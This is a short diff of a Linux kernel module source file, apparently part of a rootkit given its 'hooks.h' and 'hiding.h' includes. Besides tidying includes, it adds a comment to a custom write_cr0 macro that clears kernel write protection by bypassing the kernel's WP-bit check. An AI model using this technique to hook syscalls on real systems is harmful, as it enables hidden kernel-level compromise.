@@ -1,20 +1,11 @@
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/kallsyms.h>
-#include <linux/unistd.h> // __NR_syscall
 #include <linux/version.h> // LINUX_VERSION_CODE
-#include <linux/string.h>
-#include <linux/kthread.h>
-#include <linux/delay.h>
-#include <linux/types.h>
-#include <asm/paravirt.h> // write_cr0
-#include <linux/slab.h>		// kmalloc()
-#include <linux/syscalls.h> //__MAP, __SC_DECL
+#include <linux/syscalls.h> //__MAP, __SC_DECL, __NR_syscall
 
 #include "config.h"
 #include "hooks.h"
 #include "hiding.h"
 
+// Custom write_cr0, as the one the kernel provides checks if we are overwriting the WP bit
 #define write_cr0(val) asm volatile("mov %0, %%cr0":"+r" (val), "=m" (__force_order));
 
 void ENABLE_WRITE(void){
